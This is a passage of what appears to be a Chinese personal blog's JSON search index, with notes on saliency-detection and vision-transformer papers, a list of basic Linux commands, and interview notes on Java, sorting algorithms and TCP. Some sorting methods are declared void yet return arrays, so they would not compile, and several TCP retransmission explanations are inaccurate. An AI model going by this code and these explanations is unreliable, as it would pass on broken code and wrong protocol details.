预融合阶段首先使用具有$BatchNorm$和$ReLU$激活的$3\\times3$深度可分离卷积，表示为$DSConv_{3\\times3}$,将压缩编码器特征$f_{c}^{i},(i&#x3D;1,2,…6)$到统一信道16，然后使用通道注意算子$F_{CA}$通过加权不同信道来增强特征。这个过程可以表示为：$$\\large cf_{c}^{i}&#x3D;F_{CA}(DSConv_{3\\times3}(f_{c}^{i}))$$其中$cf_{c}^{i}$表示压缩和增强功能。为了减少特征层次，作者将6个层次分为两个层次(低级层次和高级层次)$$ \\large cf_{c}^{low}&#x3D;\\sum_{i&#x3D;0}^{3}F_{UP}^{2^{i-1} }(cf_{c}^{i}),cf_{c}^{high}&#x3D;\\sum_{i&#x3D;4}^{6}cf_{c}^{i}$$ 聚合模块由于在预融合阶段，信道数量和层次已经减少，在全融合阶段，我们直接将高层和低层层次串联起来，然后将串联馈送到预测头，以获得最终的全分辨率预测图，表示为：$$ \\large S_c&#x3D;F_{p}^{c}([cf_{e}^{low},F_{UP}^{8}(cf_{c}^{high})])$$其中$S_c$表示最终的显著性图，$F_{p}^{c}(\\cdot)$表示一个预测头，由两个$3\\times3$深度方向可分离卷积（然后是$BatchNorm$层和$ReLU$激活）、一个$3\\times3Sigmoid$激活卷积以及一个$2\\times$双线性上采样组成，以恢复原始输入大小。 损失函数总损失$\\pounds$最终由深度分支损失$\\pounds_{c}$和深度监管损失$\\pounds_{d}$构成，$$\\large \\pounds &#x3D; \\pounds_{c}(S_{c},G)+ \\pounds_{d}(S_{d},G)$$我们使用的是标准的交叉熵损失","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"}]},{"title":"Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation","slug":"多尺度高分辨率Transformer","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-12T03:36:12.863Z","comments":true,"path":"2023/04/11/多尺度高分辨率Transformer/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/%E5%A4%9A%E5%B0%BA%E5%BA%A6%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87Transformer/","excerpt":"","text":"Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation摘要VITs主要是为生成低分辨率表示的图像分类任务而设计的，这使得VITs的语义分割等密集预测任务具有挑战性，本文提出的HRVIT，通过高分辨率多分枝架构与ViT集成来增强ViT以学习语义丰富和空间精确的多尺度表示，通过各种分支块协同优化技术平衡HRVIT的模型行恩那个和效率 IntroductionVIT的单尺度和低分辨率表示对于需要高敏感性和细粒度图像细节的语义分割不友好。已有的多尺度VIT网络大多遵循类似于分类的网络拓扑，具有顺序或串联架构，基于复杂性考虑，都是逐渐对特征图进行下采样，以提取更高级别的低分辨表示，并将每个阶段的输出直接馈送到下游分割头，这样的顺序结构缺乏足够的跨尺度交互，因此没法产生高质量的高分辨率表示 HRVIT并行提取多分辨率特征并反复融合它们以生成具有丰富语义信息的高质量HR表示。简单的将HRNET中所有的卷积残差块替换为Transformer将遇到严重的可扩展性问题，如果没有良好的架构块协同优化，从多尺度继承的高表示能力可能会被硬件上令人望而却步的延迟和能源成本所击倒。因此本文使用以下方式进行优化 1）HRViT的多分支HR架构在跨分辨率融合的同时提取多尺度特征 2）使用增强局部注意力消除率冗余键和值以提高效率，并通过额外的并行卷积路径，额外的非线性单元和用于特征多样性增强的辅助快捷方式来增强模型的表达能力。 3）HRViT采用混合尺度卷积前馈网络加强多尺度特征提取 4）HRVIT的HR卷积结构和高效的补丁嵌入层在降低硬件成本的情况下保持率更多的低级细粒度特征 HRViT网络结构图 由图可知，HRViT第一部分由卷积干组成，同时提取低层特征，在卷积stem后，HRViT部署了四个渐进式Transformer阶段，其中第n阶段包含n个并行的多尺度Transformer分支，每个阶段可以有一个或多个模块。每个模块从一个轻量级密集融合层开始，以实现跨分辨率交互和一个用于局部特征提取的有效补丁嵌入块，然后是重复的增强局部自注意力块和混合尺度卷积前馈网络，与逐步降低空间维度以生成金字塔特征的顺序ViT主干不同，我们在整个网络中维护HR特征，以通过跨分辨率融合增强HR表示的质量。 多分支HRNet和self-attention运算所带来的高度复杂性会迅速导致内存占用，参数大小急剧上升，计算成本爆炸性增长，简单地在每个模块上分配相同局部注意力窗口大小的块将导致巨大的计算成本，根据对于复杂性分析， 最后决定使用狭窄的关注窗口代销，并在两条HR路径上使用最小数量的块。在中等分辨率的第三个分支，使用具有大窗口的深度分支，以提供大的感野和提取良好的高级特征。低分辨率的分支包含大多数参数们对于提供具有全局感受野的高级特征以及生成粗分割图非常有用，但是较低的空间尺度会导致图像细节丢失过多，因此旨在低分辨率的分支上部署几个大窗口块，已在参数预算下提高高级特征质量。十字形self-attention算子 cross-shaped self-attention 细粒度注意力 近似全局视图：通过两个平行正交的局部注意力，能够收集全局信息 可伸缩复杂性：窗口是一个维度固定的，避免了图像大小的二次复杂性 遵循CSWin中的十字形窗口划分方法，将输入$x\\in R^{H\\times W\\times C}$分成两部分${x_H,x_V \\in R^{H\\times W\\times C&#x2F;2}}$,$x_H$被分割成不相交的水平窗口，而另外一半$x_V$被分割成垂直窗口。将窗口设置为$s\\times W$或者$H\\times s$，在每个窗口中，将补丁分块为$K$个$d_k$维头部，然后应用局部self-attention。将零填充应用于输入$x_H$或$x_V$，以允许完整的第k个窗口，然后将注意力图中的填充区域屏蔽为0，以避免不连贯的语义关联原始的QKV线性层在计算和参数方面非常昂贵，因此共享键和值张量的线性投影，以节省计算和参数，此外，引入一个辅助路径，该路径具有并行深度方向卷积，以注入归纳偏置以促进训练，与CSWin中的局部位置编码不同，我们的并行路径是非线性的，并且在没有窗口划分的情况下应用于整个4—D特征映射$W^Vx$而没有窗口分区，这条路径可以被视为一个反向残差模块，它与self-attention中的线性投影层共享逐点卷积。这种共享路径可以有效注入归纳偏差，并以边际硬件开销的情况下增强局部特征聚合，作为对上述键值共享的性能补偿，引入一个额外的Hardswish函数来改善非线性，附加一个初始化为恒等投影的BatchNorm层以稳定分布以获得更好的可训练性，此外还添加了一个通道式投影作为多样性增强快捷方式，与传统增强的快捷方式不同，此快捷方式具有更高的非线性，不依赖于对硬件不友好的傅里叶变换。 混合尺度卷积前馈网络 受到MIT的MIxFFN和HR-NAS中多分支倒置残差块的启发，我们通过在两个线性层之间插入多个尺度深度卷积路径来设计混合尺度卷积，在MiXCFN中，在LayerForm之后，我们将信道按r的比例展开，然后将其分成两个分支，$3\\times 3$和$5 \\times 5$深度方向卷积用于增加HRViT的多尺度局部信息提取，出于效率的考虑，我们利用信道冗余，将MiXCFN扩展比r从4降到3或者2， 下采样部分self-attention的复杂度与图像大小成二次方，为解决大图像是的可伸缩性问题，在输入端对图像进行4倍的下采样，不在stem中使用注意操作，因为早期卷积比self-attention更能有效的提取低级特征，作为早期的卷积，遵循HRNet中的设计，并使用两个步长为2的CONV-BNReLU块作为更强的下采样stem，以提取C通道特征，并保留更多信息，这与之前使用步长为4的卷积ViTs不同. 在每个模块中的Transformer块之前，我们在分支上添加一个补丁嵌入块，用于匹配通道并通过增强的补丁之间通信提取补丁信息，但是n阶段的每个模块将会有n个嵌入块所带来的巨大算力代价，我们将补丁嵌入简化为逐点CONV，然后是深度CONV。 交叉分辨率融合，在每个模块的开头插入重复的交叉分辨率融合层。为了帮助LR特征保持更多的图像细节和精准的位置信息，我们将它们与下采样的HR特征合并，不使用基于渐进卷积的下采样路径来匹配张量形状，而是采用直接下采样路径来最小化算力开销，在第i个输入和第j个输出之间的下采样路径中，使用步长为$2j-i$的深度可分离卷积来缩小空间维度并匹配输出通道。 多尺度ViT分层架构来逐步下采样的金字塔特征。PVT将金字塔结构集成到ViT中以进行多尺度特征提取，Twins交织局部和全局注意力以学习多尺度表示，SegFormer提出了一种有效的分层编码器来提取粗略和精细的特征，CSWin通过多尺度十字形局部注意力进一步提高性能。 用于语义分割的多尺度表示学习：原有的分割框架是逐步对特征图进行下采样以计算LR表示，并通过上采样恢复HR特征，例如SegNet，UNet，Hourglass，HRNet通过跨分辨率融合在整个网络中维护HR表示，Lite-HRNet提出了条件通道加权块来跨分辨率交换信息，HR-NAS搜索反转残差块和辅助Transformer分支的通道","categories":[{"name":"默认分类","slug":"默认分类","permalink":"https://dfsgwb.github.io/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"}],"tags":[{"name":"High-Resolution Vision","slug":"High-Resolution-Vision","permalink":"https://dfsgwb.github.io/tags/High-Resolution-Vision/"},{"name":"Transformer","slug":"Transformer","permalink":"https://dfsgwb.github.io/tags/Transformer/"},{"name":"Segmentation","slug":"Segmentation","permalink":"https://dfsgwb.github.io/tags/Segmentation/"}]},{"title":"Multi-Scale High-Resolution Vision Transformer for Semantic Segmentation","slug":"高分辨率显著性检测的金字塔嫁接模型","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-11T12:31:25.904Z","comments":true,"path":"2023/04/11/高分辨率显著性检测的金字塔嫁接模型/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/%E9%AB%98%E5%88%86%E8%BE%A8%E7%8E%87%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B%E7%9A%84%E9%87%91%E5%AD%97%E5%A1%94%E5%AB%81%E6%8E%A5%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"Pyramid Grafting Network for One-Stage High Resolution Saliency Detection摘要由于采样深度和感受野大小之间的矛盾，大多数根据低分辨输入设计的SOD模型在高分辨率图像中表现不佳，本文提出一种金字塔嫁接网络。使用transformer和CNN主干分别从不同分辨率的图像中提取特征，然后将特征从transformer分支嫁接到CNN分支，与此同时提出一种基于注意的分叉模型嫁接模块，使CNN分支能够在解码过程中，在不同信源特征的引导下，更全面地组合破碎的细节信息，此外还设计了一个注意引导丢失来明确监督交叉嫁接模块生成注意矩阵，以帮助网络更好地与来自不同模型的注意进行交互。 困境当前主流的SOD模型遇到高分辨率的图像，为了减少内存的开销往往会将图像先下采样然后对输出结果上采样已恢复原始分辨率，由于现在的SOD模型都是使用编码器-解码器的方式设计的，随着分辨率的大幅度提高，提取的特征大小会增加，但是网络的感受野是固定的，使得相对感受野变小，最终导致无法捕获对任务至关重要的全局语义。 目前对于高分辨率SOD方法有两种主流：HRSOD和DHQSOD，其中HRSOD将整个过程分为全局阶段，局部阶段和重组阶段，全局阶段为局部阶段和作物过程提供指导。DHSOD将SOD任务分解为分类任务和回归任务，这两个任务通过他们提出的trimap和不确定性损失连接起来，它们生成具有清晰边界的相对较好的显著性贴图。但是这两者都是使用多阶段架构，将SOD分为语义(低分辨率)和细节(高分辨率)两个阶段。由此引出两个问题： 阶段间语境语义迁移不一致，在前一个阶段获得的中间映射被输入到最后一个阶段，同时错误也被传递，由此后续细化阶段可能将继续放大错误 耗时，与单阶段相比，多阶段方法不仅难以并行且参数过多，模型运行运行速度较慢 高分辨率SDO发展Zeng等人Towards High-Resolution Salient Object Detection提出了一种高分辨率显著目标检测范式，使用GSN提取语义信息，使用APS引导的LRN优化局部细节，最后使用GLFN进行预测融合。他们还提供了第一个高分辨率显著目标检测数据集（HRSOD）。Tang等人Disentangled high quality salient object detection提出，显著目标检测应分为两项任务。他们首先设计LRSCN以在低分辨率下捕获足够的语义并生成trimap。通过引入不确定性损失，所设计的HRRN可以对第一阶段使用低分辨率数据集生成的trimap进行细化。然而，它们都使用多级体系结构，这导致推理速度较慢，难以满足某些实际应用场景。更严重的问题是网络之间的语义不一致。 使用常用的SOD数据集通常分辨率较低，用他们来训练高分辨率网络和评估高质量分割存在以下几点缺点: 图像分辨率低导致细节不足 注释边缘的质量较差 注释的更加精细级别不够令人满意 当前可用的高分辨率数据集是HRSOD，但是HRSOD数据集图像数量有限,严重影响模型的泛化能力。 Staggered Grafting Framework网络框架如图所示： 由两个编码器和一个解码器构成，使用Swim transformer和ResNet18作为编码器，transformer编码器能够在低分辨率情况下获得准确的全局语义信息，卷积编码器能够在高分辨率输入下获得丰富的细节信息，不同模型之间的提取的特征可能是互补的，可以获得更多的有效特征。 在编码的过程中，向两个编码器馈送不同分辨率的图像，并行获取全局语义信息和详细信息。解码分为三个过程，一个是Swim解码，一个是嫁接编码，最后是交错结构的ResNet解码，在第二个子阶段的解码特征是从跨模态移植模块产生的，其中全局语义信息从Swin分支移植到ResNet分支，跨模态移植模块还会处理一个名为CAM的矩阵进行监督 交叉模型迁移模块(CMGM)作用：移植由两个编码器提取的特征，对于transformer所提取的特征$f_{S_2}$能够远距离捕获信息，具有全局语义信息。使用ResNet所得到的$f_{R_5}$有更好的局部信息，也就是更丰富的细节信息。但是由于特征大小和感受野之间的差异，在$f_{R_5}$中有更多的噪声。 使用常见的融合方法：如逐元素相加和相乘的适用情况限制在显著预测和不同特征生成的预测至少有一部分是对的情况下，否则就是一种错误的适用方式，且这种操作都只关注于有限的局部信息，导致没法实现自我纠错。 作者提出使用CMGM重新计算ResNet特征和Transformer特征之间的逐点关系，将全局语义信息通过transformer分支转移到ResNet分支，从而弥补常见的错误，通过计算$E&#x3D;|G-P| \\in [0,1]$得到误差图 CMGM纠错效果图 CMGM网络结构 实验结果 可视化 CUDA_VISIBLE_DEVICES&#x3D;2,3 python3 -m torch.distributed.launch –nproc_per_node&#x3D;2 train_distributed.py –batchsize 4 –master_port 29501 –savepath “..&#x2F;model&#x2F;PGNet_DUTS_Test&#x2F;“ –datapath “&#x2F;storage&#x2F;GWB&#x2F;Data&#x2F;DUTS-TR”\\","categories":[{"name":"默认分类","slug":"默认分类","permalink":"https://dfsgwb.github.io/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"}],"tags":[{"name":"Transformer","slug":"Transformer","permalink":"https://dfsgwb.github.io/tags/Transformer/"},{"name":"Segmentation","slug":"Segmentation","permalink":"https://dfsgwb.github.io/tags/Segmentation/"}]},{"title":"Liunx常用命令","slug":"Liunx常用命令","date":"2022-10-07T07:52:20.000Z","updated":"2023-04-12T02:08:21.435Z","comments":true,"path":"2022/10/07/Liunx常用命令/","link":"","permalink":"https://dfsgwb.github.io/2022/10/07/Liunx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"pwd：显示当前工作目录的绝对路径 ls:（1）-a：显示当前目录的所有文件和目录包括隐藏的 （2）-l：一列表的方式显示信息 mkdir：用于创建目录，默认是单级目录，创建多级目录加一个 -p即可 rmdir:删除空目录，如果目录下面有内容时不可以删除，如果要强行删除有内容的文件夹使用 rm -rf删除 touch指令：创建空文件 cp：拷贝指令，拷贝文件到指定目录。基本语法：cp [选项] source dest 其中-r代表可以使用递归复制的方式拷贝整个文件夹 mv:移动文件与目录或者重命名 基本语法：（1）mv oldNameFile newNameFile （重命名） （2）mv /temp/movefile /targetFolder (移动文件) cat：查看文件指令， cat [选项] 要查看的文件 -n ：显示行号 less:用来分屏查看文件内容 echo：输出内容到控制台 用法：echo [选项] [输出内容] head：用于显示文件的开头部分内容，默认情况下是显示文件的前10行内容 tail：用于显示文件中尾部的内容，默认情况下tail指令显示文件的前10行内容。语法 （1）tail文件：查看文件尾部10行内容 （2）tail -n 5 文件 查看文件尾5行内容，数字可以随便 （3）tail -f 文件 实时追踪该文档的所有更新 $&gt;$ 指令和$&gt;&gt;$指令：输出重定向和追加 基本语法：（1）ls -l &gt; 文件 （将列表的内容写入文件中覆盖的方式） （2）ls -al &gt;&gt;文件 （将列表的内容追加写入到文件中） （3）cat 文件1 &gt; 文件2 （将文件1的内容覆盖到文件2） ln：软连接也称为符号链接，类似于windows中的快捷方式，主要存放了链接其他文件的路径 基本语法： ln -s [原文件或目录] [软链接名] （给原文件创建一个软链接） history：查看已经执行过的历史指令，也可以执行历史指令","categories":[{"name":"Liunx","slug":"Liunx","permalink":"https://dfsgwb.github.io/categories/Liunx/"}],"tags":[{"name":"Liunx","slug":"Liunx","permalink":"https://dfsgwb.github.io/tags/Liunx/"}]},{"title":"腾讯云智实习面试","slug":"腾讯云智实习面试","date":"2022-07-07T08:30:16.000Z","updated":"2023-07-07T13:40:07.841Z","comments":true,"path":"2022/07/07/腾讯云智实习面试/","link":"","permalink":"https://dfsgwb.github.io/2022/07/07/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%99%BA%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/","excerpt":"","text":"自我介绍网盘项目1.项目分工 2.文件上传，存储过程 3.服务器是用什么，多大？ 4.考虑过数据丢失问题吗？如果要加强数据可靠性，有什么方法可以优化？ 5.有考虑过其他存储系统吗？ 6.文件量有多少？ 7.项目比较亮点的地方？项目安全性，使用 MD5 加密 8.MD5 加盐加密是如何实现的，服务端收到的密码是明文的，怎么保证传输的时候不被监听？ 加盐加密是指为每个用户生成一个随机的盐值，并在哈希之前添加到他们的密码中，然后，该盐值与散列密码一起存储在数据库中，当用户登陆时，将从数据库中检索盐值并将其添加到用户输入的密码中，并对结果字符串进行哈希处理，如果生成的散列与存储在数据库中的散列匹配，则对用户进行身份验证，否则，用户将被拒绝访问。为了确保密码在传输过程中不会被截获，可以使用 SSL&#x2F;TLS 协议加密客户端和服务器之间的通信，这样，即使有人截获了密码，也无法解密它。 // 生成随机盐值 public static String getSalt(int n) &#123; char[] chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()&quot;.toCharArray(); StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; n; i++) &#123; char c = chars[new Random().nextInt(chars.length)]; sb.append(c); &#125; return sb.toString(); &#125; // 加盐MD5加密 public static String getSaltMD5(String password, String salt) &#123; password = md5Hex(password + salt); char[] cs = new char[48]; for (int i = 0; i &lt; 48; i += 3) &#123; cs[i] = password.charAt(i / 3 * 2); char c = salt.charAt(i / 3); cs[i + 1] = c; cs[i + 2] = password.charAt(i / 3 * 2 + 1); &#125; return new String(cs); &#125; Java 部分垃圾回收的几种方法 标记-清除算法、复制算法、标记-整理算法、分代收集算法 1.标记-清除算法:通过标记所有活动对象，然后清除所有没有标记的对象来回收内存。缺点是效率低，内存碎片化严重。分为两个过程：标记过程和清除过程。在标记阶段，垃圾回收器会从根对象开始遍历所有可达对象，并将其标记为活动对象。在清除阶段，垃圾回收器会清除所有未标记的对象，然后回收它们所占用的内存。 2.复制算法：它将内存分为两个区域，每次只使用其中一个区域，当这个区域用完了，就将还活着的对象复制到另一个区域，然后清除已经使用过的区域。这样保证了每次回收的内存都是连续的，避免了内存碎片的问题。缺点是内存利用率低，但是效率高，适用于存活对象较少的场景。 3.标记整理法：是改进的一种标记清理法，它在清除阶段不仅会回收未标记的对象，还会将所有活动对象移动到内存的一端，然后将令一端全部清空，这样保证了内存的连续性问题，避免了内存碎片化的问题。 4.分代收集法：分代收集法是一种常见的垃圾回收方法，它将内存分为不同的代，每一代都有不同的回收策略，一般来说，新创建的对象会被分配到年轻代，年轻代使用复制法进行垃圾回收，老年代使用标记清除法或标记整理法进行垃圾回收。 排序算法1.了解哪些排序算法，快排和堆排序的区别 冒泡排序：冒泡排序是一种简单的排序算法，它重复地遍历要排序的数列，一次比较两个元素，如果它们的顺序错误就交换位置。时间复杂度为 O(n^2)。 // 冒泡排序 public static void bubbleSort(int arr[])&#123; int temp; for(int i=0;i&lt;arr.length-1;i++)&#123; for(int j=0;j&lt;arr.length-1-i;j++)&#123; if(arr[j]&gt;arr[j+1])&#123; temp=arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; &#125; &#125; &#125; return arr; &#125; 插入排序：插入排序是一种简单的排序算法，它将待排序的数列分为已排序和未排序两部分，每次从未排序的部分取出一个元素，插入到已排序的部分中的适当位置。时间复杂度为 O(n^2)。 // 插入排序 public static void insertSort(int arr[])&#123; int temp; for(int i=1;i&lt;arr.length;i++)&#123; for(int j=i;j&gt;0;j--)&#123; if(arr[j]&lt;arr[j-1])&#123; temp=arr[j]; arr[j]=arr[j-1]; arr[j-1]=temp; &#125; &#125; &#125; return arr; &#125; 选择排序：选择排序是一种简单的排序算法，它重复地从未排序的部分选择最小的元素，将其放到已排序的部分的末尾。时间复杂度为 O(n^2)。 // 选择排序 public static void selectSort(int arr[])&#123; int temp; for(int i=0;i&lt;arr.length-1;i++)&#123; int min=i; for(int j=i+1;j&lt;arr.length;j++)&#123; if(arr[j]&lt;arr[min])&#123; min=j; &#125; &#125; temp=arr[i]; arr[i]=arr[min]; arr[min]=temp; &#125; return arr; &#125; 快速排序：快速排序是一种常用的排序算法，它使用分治的思想，将待排序的数列分成两部分，一部分比另一部分小，然后对这两部分分别进行快速排序。时间复杂度为 O(nlogn)。 // 快速排序 public static void quickSort(int arr[],int low,int high)&#123; int i,j,temp,t; if(low&gt;high)&#123; return; &#125; i=low; j=high; temp=arr[low]; while(i&lt;j)&#123; while(temp&lt;=arr[j]&amp;&amp;i&lt;j)&#123; j--; &#125; while(temp&gt;=arr[i]&amp;&amp;i&lt;j)&#123; i++; &#125; if(i&lt;j)&#123; t=arr[j]; arr[j]=arr[i]; arr[i]=t; &#125; &#125; arr[low]=arr[i]; arr[i]=temp; quickSort(arr,low,j-1); quickSort(arr,j+1,high); &#125; 归并排序：归并排序是一种常用的排序算法，它使用分治的思想，将待排序的数列分成若干个子序列，每个子序列都是有序的，然后再将子序列合并成一个有序的序列。时间复杂度为 O(nlogn)。 // 归并排序 public static void mergeSort(int arr[],int left,int right)&#123; if(left&lt;right)&#123; int mid=(left+right)/2; mergeSort(arr,left,mid); mergeSort(arr,mid+1,right); merge(arr,left,mid,right); &#125; &#125; public static void merge(int arr[],int left,int mid,int right)&#123; int temp[]=new int[arr.length]; int i=left; int j=mid+1; int t=0; while(i&lt;=mid&amp;&amp;j&lt;=right)&#123; if(arr[i]&lt;=arr[j])&#123; temp[t++]=arr[i++]; &#125;else&#123; temp[t++]=arr[j++]; &#125; &#125; while(i&lt;=mid)&#123; temp[t++]=arr[i++]; &#125; while(j&lt;=right)&#123; temp[t++]=arr[j++]; &#125; t=0; while(left&lt;=right)&#123; arr[left++]=temp[t++]; &#125; &#125; 堆排序：堆排序是一种常用的排序算法，它使用堆这种数据结构，将待排序的数列构建成一个堆，然后依次取出堆顶元素，将其放到已排序的部分的末尾。时间复杂度为 O(nlogn)。 // 堆排序 public static void heapSort(int arr[])&#123; int len=arr.length; for(int i=len/2-1;i&gt;=0;i--)&#123; adjustHeap(arr,i,len); &#125; for(int j=len-1;j&gt;0;j--)&#123; swap(arr,0,j); adjustHeap(arr,0,j); &#125; &#125; public static void adjustHeap(int arr[],int i,int len)&#123; int temp=arr[i]; for(int k=2*i+1;k&lt;len;k=2*k+1)&#123; if(k+1&lt;len&amp;&amp;arr[k]&lt;arr[k+1])&#123; k++; &#125; if(arr[k]&gt;temp)&#123; arr[i]=arr[k]; i=k; &#125;else&#123; break; &#125; &#125; arr[i]=temp; &#125; 为什么说快排的效率最高 快速排序的时间复杂度为 O(nlogn)，在平均情况下，它的效率是最高的。这是因为快速排序使用了分治的思想，将待排序的数列分成两部分，一部分比另一部分小，然后对这两部分分别进行快速排序。在每一次排序中，快速排序都能够将一个元素放到它最终的位置上，这样就避免了冒泡排序和插入排序中的多次交换操作，从而提高了效率。 此外，快速排序的实现比较简单，代码量较小，而且它是一种原地排序算法，不需要额外的存储空间，这也是它被广泛使用的原因之一。 然而，快速排序的最坏时间复杂度为 O(n^2)，在最坏情况下，它的效率会变得很低。为了避免这种情况，可以使用一些优化技巧，比如随机化快速排序、三路快排等。 TCP 握手过程TCP 握手是建立 TCP 连接时的一种协议，它包括三个步骤： 第一次握手：客户端向服务器发送一个 SYN 包，其中 SYN 标志位被设置为 1，表示客户端请求建立连接。客户端会随机选择一个初始序列号，并将其放在 SYN 包的序列号字段中。 第二次握手：服务器收到客户端的 SYN 包后，会向客户端发送一个 ACK 包和一个 SYN 包。其中 ACK 标志位被设置为 1，表示服务器已经收到了客户端的 SYN 包；SYN 标志位也被设置为 1，表示服务器同意建立连接。服务器会随机选择一个初始序列号，并将其放在 SYN 包的序列号字段中。 第三次握手：客户端收到服务器的 ACK 包和 SYN 包后，会向服务器发送一个 ACK 包。其中 ACK 标志位被设置为 1，表示客户端已经收到了服务器的 SYN 包。客户端会将服务器的初始序列号加 1，并将其放在 ACK 包的确认号字段中。 完成这三个步骤后，TCP 连接就建立成功了。在连接建立后，客户端和服务器可以互相发送数据。当连接关闭时，双方会进行四次握手，以确保数据传输的完整性。 如果服务器响应的报文丢失，客户端会怎么做？ 如果客户端发送的 SYN 包丢失，客户端会超时重传 SYN 包。如果服务器响应的 SYN 包丢失，客户端会在一定时间内等待服务器的响应，如果超时还没有收到响应，客户端会重新发送 SYN 包。 如果客户端发送的 ACK 包丢失，服务器会超时重传 SYN 包和 ACK 包。如果服务器发送的 ACK 包丢失，客户端会在一定时间内等待服务器的响应，如果超时还没有收到响应，客户端会重新发送 ACK 包。 在 TCP 连接建立过程中，如果有任何一个包丢失，都会导致连接建立失败。因此，TCP 协议中的握手过程是可靠的，可以保证连接的可靠性和完整性。 超时重传的时间是多少？ TCP 超时重传的时间是动态调整的，根据网络状况和拥塞程度进行调整。TCP 协议中使用的超时重传算法是基于自适应超时重传算法（Adaptive Retransmission Timeout，简称 ARQ）的。 在 TCP 协议中，每次发送数据时都会启动一个定时器，如果在规定的时间内没有收到对方的确认信息，就会触发超时重传机制。TCP 协议中的超时时间是根据网络延迟和拥塞程度进行动态调整的，一般情况下，超时时间会从一个较小的初始值开始，然后逐渐增加，直到收到对方的确认信息为止。 具体来说，TCP 协议中的超时时间是根据往返时间（Round Trip Time，简称 RTT）和偏差（Deviation）来计算的。RTT 是指数据从发送方发送到接收方并返回的时间，偏差是指 RTT 的变化量。TCP 协议中的超时时间一般是根据以下公式计算的：Timeout &#x3D; RTT + 4 * Deviation 其中，RTT 和 Deviation 的计算需要根据具体的算法来实现。TCP 协议中常用的算法包括 Karn 算法、Jacobson 算法和 TCP Vegas 算法等 超时重传机制 TCP 协议中的超时重传机制是指在发送数据时，如果在规定的时间内没有收到对方的确认信息，就会触发超时重传机制，重新发送数据。超时重传机制是 TCP 协议中保证数据可靠性的重要机制之一。 具体来说，TCP 协议中的超时重传机制包括以下几个步骤： 发送数据：发送方将数据发送给接收方，并启动一个定时器。 等待确认：发送方等待接收方的确认信息，如果在规定的时间内没有收到确认信息，就会触发超时重传机制。 重传数据：发送方重新发送数据，并重新启动定时器。 等待确认：发送方等待接收方的确认信息，如果在规定的时间内没有收到确认信息，就会再次触发超时重传机制。 放弃重传：如果重传次数达到一定的阈值，发送方会放弃重传，认为数据已经丢失。 TCP 协议中的超时重传机制是可靠的，可以保证数据的可靠性和完整性。但是，如果超时时间设置得过短，会导致过多的重传，影响网络性能；如果超时时间设置得过长，会导致数据传输的延迟。因此，TCP 协议中的超时时间是根据网络状况和拥塞程度进行动态调整的。 synchronized 和 ReentrantLock 的区别？synchronized 和 ReentrantLock 都是 Java 中用于实现线程同步的机制，它们的作用是保证多个线程之间的互斥访问。它们的区别如下： 锁的获取方式不同：synchronized 是 Java 中的关键字，它是隐式锁，即在代码块或方法上加上 synchronized 关键字后，系统会自动加锁和释放锁。而 ReentrantLock 是 Java 中的类，它是显式锁，需要手动调用 lock()方法获取锁和 unlock()释放锁。 锁的释放方式不同：synchronized 关键字在代码块或方法执行完毕后会自动释放锁，而 ReentrantLock 需要手动调用 unlock()方法来释放锁。 锁的可重入性不同：synchronized 是可重入锁，即同一个线程可以多次获取同一个锁,不会造成死锁，而 ReentrantLock 也是可重入锁，但需要手动调用 lock()和 unlock()实现，次数要相匹配。但是，需要注意的是，synchronized 是基于 JVM 实现的，而 ReentrantLock 是基于 AQS(AbstractQueuedSynchronizer) 实现的，AQS 是一个 FIFO 队列，因此 ReentrantLock 是可以指定获取锁的顺序的。 锁的公平性不同：synchronized 是非公平锁，即线程获取锁的顺序是不确定的，而 ReentrantLock 可以是公平锁或非公平锁，可以通过构造函数来指定。 锁的灵活性不同：ReentrantLock 提供了更多的方法来控制锁的行为，比如可以设置超时时间、中断等待锁的线程等。synchronized 关键字的锁的行为比较固定，只能等待获取锁。 总的来说，synchronized 是 Java 中内置的一种锁机制，使用方便，但灵活性较差；而 ReentrantLock 是 Java 中提供的一种可重入锁，使用时需要手动获取和释放锁，但灵活性更高，可以更好地控制锁的行为。 syncronized 可以加锁的地方有哪些? synchronized 关键字可以用于修饰方法和代码块，用于修饰方法时，表示对整个方法加锁，用于修饰代码块时，表示对代码块中的内容加锁。synchronized 关键字可以用于修饰实例方法、静态方法和代码块，分别表示对实例方法、静态方法和代码块中的内容加锁。 Java 里面如果要用堆的结构，可以使用哪个类？ Java 中可以使用 PriorityQueue 类来实现堆结构，PriorityQueue 类是一个优先队列，它是基于优先堆实现的，可以用来实现堆结构。PriorityQueue 类是一个无界队列，即队列的长度可以无限制地增加，PriorityQueue 类中的元素可以默认自然排序或者通过 Comparator 接口来指定排序规则，PriorityQueue 类不允许插入 null 元素。","categories":[{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/categories/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"2023百度面试(一)","slug":"2023百度面试(一)","date":"2022-07-07T08:30:16.000Z","updated":"2023-07-12T08:48:46.774Z","comments":true,"path":"2022/07/07/2023百度面试(一)/","link":"","permalink":"https://dfsgwb.github.io/2022/07/07/2023%E7%99%BE%E5%BA%A6%E9%9D%A2%E8%AF%95(%E4%B8%80)/","excerpt":"","text":"shiro 的组件Apache Shiro 是一个强大且易于使用的 Java 